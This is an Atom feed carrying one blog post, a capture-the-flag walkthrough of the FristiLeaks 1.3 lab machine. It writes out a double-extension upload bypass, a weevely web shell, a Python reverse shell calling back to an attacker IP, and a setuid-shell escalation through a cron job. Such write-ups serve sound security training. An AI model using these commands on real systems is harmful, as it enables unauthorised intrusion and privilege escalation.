<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Fristileaks | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/fristileaks/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-12-15T09:29:03+01:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[FristiLeaks: 1.3]]></title>
    <link href="http://73696e65.github.io/blog/2015/12/15/fristileaks-1-dot-3/"/>
    <updated>2015-12-15T08:45:49+01:00</updated>
    <id>http://73696e65.github.io/blog/2015/12/15/fristileaks-1-dot-3</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">FristiLeaks: 1.3</a></p>

<p>Nmap output:
{% codeblock %}
root@kali32:~$ sudo nmap 192.168.80.128 -sT -p-</p>

<p>Starting Nmap 7.00 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2015-12-14 23:16 CET
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1055.59 seconds
{% endcodeblock %}</p>

<p>Only http port is open. There is a <code>robots.txt</code> file with the following content:</p>

<p>{% codeblock %}
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
{% endcodeblock %}</p>

<p>Nothing useful here, but our guess to try <code>/fristi</code> reveals in comment:</p>

<p>{% codeblock lang:html %}</p>

<!--
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->


<p>&hellip;
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
{% endcodeblock %}</p>

<p>The first hint was about username, the second one contains base64 encoded <code>png</code>
file with the password. So we use them (<code>eezeepz / keKkeKKeKKeKkEkkEk</code>). Now we
need to evade the image upload filtering.</p>

<p>After trying different methods, finally we change for POST method the request for
double extensions:
{% codeblock lang:html %}
Content-Disposition: form-data; name=&ldquo;fileToUpload&rdquo;; filename=&ldquo;test.php.gif&rdquo;</p>

<p>&hellip;
<html>
<body>
Uploading, please wait<br />The file has been uploaded to /uploads <br /></body>
</html>
{% endcodeblock %}</p>

<p>The file that we uploaded was generated using <code>weevely</code> and after connecting:</p>

<p>{% codeblock %}
root@kali32:~$ weevely generate 1234 /tmp/test.php.gif</p>

<p>root@kali32:~$ weevely <a href="http://192.168.80.128/fristi/uploads/test.php.gif">http://192.168.80.128/fristi/uploads/test.php.gif</a> 1234 id
uid=48(apache) gid=48(apache) groups=48(apache)</p>

<p>root@kali32:~$ weevely <a href="http://192.168.80.128/fristi/uploads/test.php.gif">http://192.168.80.128/fristi/uploads/test.php.gif</a> 1234
{% endcodeblock %}</p>

<p>We do a little investigation:
{% codeblock lang:php %}
localhost.localdomain:/var/www/html/fristi $ head checklogin.php
&lt;?php</p>

<p>ob_start();
$host=&ldquo;localhost&rdquo;; // Host name
$username=&ldquo;eezeepz&rdquo;; // Mysql username
$password=&ldquo;4ll3maal12#&rdquo;; // Mysql password
$db_name=&ldquo;hackmenow&rdquo;; // Database name
$tbl_name=&ldquo;members&rdquo;; // Table name</p>

<p>// Connect to server and select databse.
{% endcodeblock %}</p>

<p>{% codeblock %}
localhost.localdomain:/var/www/html/fristi/uploads $ :audit_etcpasswd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
<a href="ftp:x:14:50:FTP">ftp:x:14:50:FTP</a> User:/var/<a href="ftp:/sbin/nologin">ftp:/sbin/nologin</a>
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
vboxadd:x:498:1::/var/run/vboxadd:/bin/false
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
fristi:x:503:100::/var/www:/sbin/nologin
{% endcodeblock %}</p>

<p>{% codeblock %}
localhost.localdomain:/var/www/html/fristi/uploads $ :audit_suidsgid /
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| /bin/mount                       |
| /bin/fusermount                  |
| /bin/umount                      |
| /bin/su                          |
| /bin/ping                        |
| /bin/ping6                       |
| /sbin/netreport                  |
| /sbin/pam_timestamp_check        |
| /sbin/unix_chkpwd                |
| /usr/bin/crontab                 |
| /usr/bin/chsh                    |
| /usr/bin/sudo                    |
| /usr/bin/chfn                    |
| /usr/bin/write                   |
| /usr/bin/newgrp                  |
| /usr/bin/ssh-agent               |
| /usr/bin/chage                   |
| /usr/bin/gpasswd                 |
| /usr/bin/passwd                  |
| /usr/bin/wall                    |
| /usr/libexec/utempter/utempter   |
| /usr/libexec/openssh/ssh-keysign |
| /usr/libexec/pt_chown            |
| /usr/sbin/suexec                 |
| /usr/sbin/postqueue              |
| /usr/sbin/usernetctl             |
| /usr/sbin/postdrop               |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
{% endcodeblock %}</p>

<p>We use another python backdoor as reverse shell to redirect tty in python:
{% codeblock %}
root@kali32:~$ nc -l -p 1337</p>

<p>weevely> python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; 192.168.80.137 1337
{% endcodeblock %}</p>

<p>In the home directory of <code>eezeepz</code> user, there is <code>notes.txt</code> file with the instruction for cron:
{% codeblock %}
bash-4.1$ cat /home/eezeepz/notes.txt
cat /home/eezeepz/notes.txt
Yo EZ,</p>

<p>I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/</p>

<p>Don&rsquo;t forget to specify the full path for each binary!</p>

<p>Just put a file called &ldquo;runthis&rdquo; in /tmp/, each line one command. The
output goes to the file &ldquo;cronresult&rdquo; in /tmp/. It should
run every minute with my account privileges.</p>

<ul>
<li>Jerry
{% endcodeblock %}</li>
</ul>


<p>The escalation process is straightforward, we inject our code to execute shell
and set suid permission using admin&rsquo;s account:</p>

<p>{% codeblock %}
bash-4.1$ echo &lsquo;#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
   setreuid(geteuid(),geteuid());
   execve(&ldquo;/bin/sh&rdquo;, NULL, NULL);</p>

<p>   return 0;
}
&lsquo; > /tmp/run.c
{% endcodeblock %}</p>

<p>{% codeblock %}
bash-4.1$ gcc run.c -o run
gcc run.c -o run</p>

<p>bash-4.1$ echo &ldquo;/home/admin/cat /tmp/run > /tmp/run-admin&rdquo; > /tmp/runthis
bash-4.1$ echo &ldquo;/home/admin/chmod a+xs /tmp/run-admin&rdquo; >> /tmp/runthis</p>

<p>{% endcodeblock %}</p>

<p>After the few seconds of waiting, we escalated our privileges to <code>admin</code>:
{% codeblock %}
bash-4.1$ ./run-admin
./run-admin
bash-4.1$ id
id
uid=501(admin) gid=48(apache) groups=48(apache)</p>

<p>{% endcodeblock %}</p>

<p>We do some recon in admin directory, there is obfuscated password and encoding routine:</p>

<p>{% codeblock %}
bash-4.1$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
{% endcodeblock %}</p>

<p>{% codeblock lang:python %}
bash-4.1$ cat cryptpass.py
cat cryptpass.py</p>

<h1>Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</h1>

<p>import base64,codecs,sys</p>

<p>def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], &lsquo;rot13&rsquo;)</p>

<p>cryptoResult=encodeString(sys.argv[1])
print cryptoResult
{% endcodeblock %}</p>

<p>So the password is at first base64 encoded, then reversed and shifted using rot13. We reverse the process in python:</p>

<p>{% codeblock lang:python %}
import base64,codecs,sys
base64.b64decode( codecs.encode(&lsquo;=RFn0AKnlMHMPIzpyuTI0ITG&rsquo;, &lsquo;rot13&rsquo;)[::-1] )
&lsquo;LetThereBeFristi!&rsquo;
{% endcodeblock %}</p>

<p>We found the password for <code>fristigod</code> user:</p>

<p>{% codeblock %}
bash-4.1$ su fristigod
su fristigod
Password: LetThereBeFristi!</p>

<p>bash-4.1$ id
id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
{% endcodeblock %}</p>

<p>In his directory, there is a binary with the user authorization and
<code>.bash_history</code> file, we use <code>sudo</code> the same way as previously invoked according the history file:</p>

<p>{% codeblock %}
bash-4.1$ cat .bash_history
cat .bash_history
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
sudo /var/fristigod/.secret_admin_stuff/doCom
exit
sudo /var/fristigod/.secret_admin_stuff/doCom
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
groups
ls -lah
usermod -G fristigod fristi
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
less /var/log/secure e
Fexit
exit
exit</p>

<p>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
[sudo] password for fristigod: LetThereBeFristi!</p>

<p>bin   dev  home  lib64       media  opt   root  selinux  sys  usr
boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var
bash-4.1$</p>

<p>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)</p>

<p>bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom sh
sh-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
{% endcodeblock %}</p>

<p>Finally the flag:
{% codeblock %}
sh-4.1# cat /root/fristileaks_secrets.txt
cat /root/fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [<a href="https://tldr.nu">https://tldr.nu</a>]</p>

<p>I wonder if you beat it in the maximum 4 hours it&rsquo;s supposed to take!</p>

<p>Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</p>

<p>Flag: Y0u_kn0w_y0u_l0ve_fr1st1
{% endcodeblock %}</p>

<p>Thanks for this challenge, it took me nearly 2 hours to finish.</p>
]]></content>
  </entry>
  
</feed>
